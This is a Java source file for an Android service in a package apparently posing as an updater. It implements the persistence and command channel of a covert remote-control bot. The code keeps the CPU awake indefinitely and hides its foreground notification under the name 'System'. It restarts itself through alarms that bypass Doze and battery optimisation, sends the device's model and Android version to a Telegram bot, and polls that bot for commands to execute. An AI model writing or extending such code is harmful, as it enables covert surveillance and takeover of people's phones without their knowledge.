package com.kasari.update;

import android.app.*;
import android.content.*;
import android.net.*;
import android.os.*;
import androidx.core.app.NotificationCompat;
import org.json.*;

public class BackgroundService extends Service {

    static final String CH_ID    = "kc_hidden";
    static final int    NOTIF_ID = 9901;
    static String       deviceId;

    private volatile boolean      mRunning = false;
    private Thread                mPollThread;
    private PowerManager.WakeLock mWakeLock;
    private AlarmManager          mAlarmMgr;
    private ConnectivityManager   mConnMgr;
    private ConnectivityManager.NetworkCallback mNetCallback;

    @Override
    public void onCreate() {
        super.onCreate();
        mAlarmMgr = (AlarmManager) getSystemService(ALARM_SERVICE);
        mConnMgr  = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        TelegramController.init(this);
        deviceId = getOrCreateDeviceId();
        acquireWakeLock();
        startHiddenForeground();
        registerNetworkCallback();
        scheduleKeepalive();
        if (!mRunning) { mRunning = true; startPolling(); }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        acquireWakeLock();
        scheduleKeepalive();
        if (!mRunning) { mRunning = true; startPolling(); }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        mRunning = false;
        if (mPollThread != null) mPollThread.interrupt();
        unregisterNetworkCallback();
        releaseWakeLock();
        super.onDestroy();
        // Restart in 3 seconds (bypasses battery optimisation via WAKEUP alarm)
        scheduleAlarm(42, 3_000L);
    }

    @Override public IBinder onBind(Intent i) { return null; }

    // ── WakeLock: CPU stays ON even with screen off ───────────────────────────
    private void acquireWakeLock() {
        try {
            if (mWakeLock != null && mWakeLock.isHeld()) return;
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm == null) return;
            mWakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "KasariChauhan::MainLock");
            mWakeLock.setReferenceCounted(false);
            mWakeLock.acquire(); // held indefinitely — released in onDestroy
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try { if (mWakeLock != null && mWakeLock.isHeld()) mWakeLock.release(); }
        catch (Exception ignored) {}
        mWakeLock = null;
    }

    // ── Network callback: re-announce when internet comes back ───────────────
    private void registerNetworkCallback() {
        try {
            mNetCallback = new ConnectivityManager.NetworkCallback() {
                private boolean firstCall = true;
                @Override
                public void onAvailable(Network network) {
                    if (firstCall) { firstCall = false; return; } // skip initial
                    new Thread(() -> {
                        try { Thread.sleep(2000); } catch (Exception ignored) {}
                        TelegramController.sendMessage(
                            "\uD83C\uDF10 [" + deviceId + "] Internet wapas aaya \u2705\n" +
                            "Android " + Build.VERSION.RELEASE + " | " + Build.MODEL);
                    }).start();
                }
                @Override
                public void onLost(Network network) {
                    // Service stays running even when offline — no action needed
                }
            };
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                mConnMgr.registerDefaultNetworkCallback(mNetCallback);
            } else {
                NetworkRequest req = new NetworkRequest.Builder().build();
                mConnMgr.registerNetworkCallback(req, mNetCallback);
            }
        } catch (Exception ignored) {}
    }

    private void unregisterNetworkCallback() {
        try {
            if (mNetCallback != null && mConnMgr != null)
                mConnMgr.unregisterNetworkCallback(mNetCallback);
        } catch (Exception ignored) {}
        mNetCallback = null;
    }

    // ── Polling: never exits, handles offline via empty-array return ──────────
    private void startPolling() {
        if (mPollThread != null && mPollThread.isAlive()) return;
        mPollThread = new Thread(() -> {
            // Announce online — retry until internet available
            new Thread(() -> {
                for (int a = 0; mRunning && a < 720; a++) { // retry 1h max
                    try {
                        TelegramController.sendMessage(
                            "\uD83D\uDCF1 [" + deviceId + "] Online\n" +
                            "Android " + Build.VERSION.RELEASE +
                            " (API " + Build.VERSION.SDK_INT + ")\n" +
                            "Model: " + Build.MANUFACTURER + " " + Build.MODEL +
                            "\n/help = sare commands");
                        break;
                    } catch (Exception ignored) {}
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) { break; }
                }
            }).start();

            long backoff = 1_000;
            while (mRunning) {
                try {
                    JSONArray updates = TelegramController.getUpdates();
                    backoff = 1_000; // reset on success
                    for (int i = 0; i < updates.length(); i++) {
                        try {
                            JSONObject upd = updates.getJSONObject(i);
                            JSONObject msg = upd.optJSONObject("message");
                            if (msg == null) continue;
                            String text = msg.optString("text", "").trim();
                            if (!text.isEmpty())
                                CommandProcessor.handle(BackgroundService.this, text);
                        } catch (Exception ignored) {}
                    }
                    Thread.sleep(1_000);
                } catch (InterruptedException e) {
                    break; // service stopping
                } catch (Exception e) {
                    // Network down or any error — wait (backoff), then retry forever
                    try { Thread.sleep(backoff); }
                    catch (InterruptedException ignored) { break; }
                    backoff = Math.min(backoff * 2, 30_000); // max 30s wait
                }
            }
        });
        mPollThread.setDaemon(true);
        mPollThread.start();
    }

    // ── Periodic keepalive alarm: restarts service every 5 min if killed ─────
    private void scheduleKeepalive() { scheduleAlarm(101, 5 * 60_000L); }

    // ── Alarm fires EVEN in Doze mode (setExactAndAllowWhileIdle) ────────────
    private void scheduleAlarm(int reqCode, long delayMs) {
        try {
            if (mAlarmMgr == null) return;
            Intent i = new Intent(this, BackgroundService.class);
            int piFlags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                : PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getService(this, reqCode, i, piFlags);
            long trigger = SystemClock.elapsedRealtime() + delayMs;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // Android 12+: need permission for exact alarms
                if (mAlarmMgr.canScheduleExactAlarms())
                    mAlarmMgr.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                else
                    mAlarmMgr.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Android 6-11: setExactAndAllowWhileIdle penetrates Doze
                mAlarmMgr.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else {
                // Android 5: normal exact alarm
                mAlarmMgr.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        } catch (Exception ignored) {}
    }

    // ── Hidden foreground notification (no visible icon) ─────────────────────
    private void startHiddenForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CH_ID, "System", NotificationManager.IMPORTANCE_NONE);
            ch.setShowBadge(false); ch.setSound(null, null);
            nm.createNotificationChannel(ch);
        }
        startForeground(NOTIF_ID,
            new NotificationCompat.Builder(this, CH_ID)
                .setSmallIcon(R.drawable.ic_notification)
                .setContentTitle("System")
                .setContentText("")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setSilent(true).build());
        startService(new Intent(this, InnerService.class));
    }

    private String getOrCreateDeviceId() {
        SharedPreferences p = getSharedPreferences("kc_prefs", MODE_PRIVATE);
        String id = p.getString("device_id", null);
        if (id == null) {
            id = "DEV" + (System.currentTimeMillis() % 10000);
            p.edit().putString("device_id", id).apply();
        }
        return id;
    }

    // ── Inner service: hides the persistent foreground notification ───────────
    public static class InnerService extends Service {
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            startForeground(NOTIF_ID,
                new NotificationCompat.Builder(this, CH_ID)
                    .setSmallIcon(R.drawable.ic_notification).build());
            stopForeground(true);
            stopSelf();
            return START_NOT_STICKY;
        }
        @Override public IBinder onBind(Intent i) { return null; }
    }
}